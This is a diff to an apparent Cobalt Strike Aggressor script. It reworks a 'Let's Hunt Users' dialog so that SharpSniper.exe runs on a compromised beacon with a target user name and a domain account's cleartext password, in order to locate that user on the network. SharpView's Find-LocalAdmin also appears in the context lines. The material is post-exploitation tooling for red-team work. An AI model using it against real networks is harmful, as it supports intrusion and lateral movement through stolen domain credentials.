@@ -628,45 +628,19 @@ bexecute_assembly($bids, script_resource('../exe/SharpView.exe'), "Find-LocalAdm
 #############################################
 
 sub userloc_creds{
- # beacon ID
     $bid = $1;
-    
- # command arugement variable  
-    $cmdargs = "";
-  
- # Pop Dialog Box and control flow
-    $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({
- 
- # manipulate the first argument depending on the executables command line switch statements
- # manipulate the second argument depending on the expected input format  
-        foreach $key => $value ($3){
-            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
-                $cmdargs .= $key; #User to find
-                $cmdargs .= ' ';
-                $cmdargs .= $key; #DA Creds
-                $cmdargs .= ' ';
-                $cmdargs .= $key; #DA Password 
-            }
- # manipulate the first argument depending on the executables command line switch statements            
-            else if ($value eq "true"){
-                $cmdargs .= ' /';
-                $cmdargs .= $key;
-            }
-        }
- # btask just displays message in beacon window
- # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
-       if ($3["execmethod"] eq "Execute-Assembly"){
+    $dialog = dialog("Let's Hunt Users", %(userloc => "", readaccess => "", clearpass => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['userloc'] $3['readaccess'] $3['clearpass']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
             btask($bid, 'Attempting to Locate User');
-            bexecute_assembly($bid, script_resource('/exe/SharpSniper.exe'), $cmdargs);
+            bexecute_assembly($bid, script_resource('../exe/SharpSniper.exe'), $cmdargs);
         }
-      
     }));
-    
- # Dialog box contents and text boxes mapped to command line argument keys   
-    dialog_description($dialog, "Let's Hunt Users");
-    drow_text($dialog, "",  "User to Locate");
-    drow_text($dialog, "",  "User w/DC Read Access");
-    drow_text($dialog, "",  "Cleartext Password");
+    dialog_description($dialog, "You can't use FQDN, You need cleartext creds for someone with read access to the Domain Controller");
+    drow_text($dialog, "userloc",  "User to Locate");
+    drow_text($dialog, "readaccess",  "User w/DC Read Access");
+    drow_text($dialog, "clearpass",  "Cleartext Password");
     dbutton_action($dialog, "Run");
 	dialog_show($dialog);
 }
